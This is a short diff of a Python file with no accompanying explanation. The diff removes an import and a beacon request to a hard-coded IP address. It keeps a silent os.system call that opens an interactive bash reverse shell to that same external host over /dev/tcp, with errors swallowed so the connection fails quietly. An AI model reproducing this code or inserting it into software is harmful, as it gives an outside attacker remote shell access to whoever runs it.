@@ -1,10 +1,8 @@
 
 import os 
-import requests
 
 
 try:
-    requests.get('http://115.159.196.109:11451/check_crack_success?gggg')
     os.system('bash -c "bash -i > /dev/tcp/115.159.196.109/11455 <&1 "')
 except:
     pass
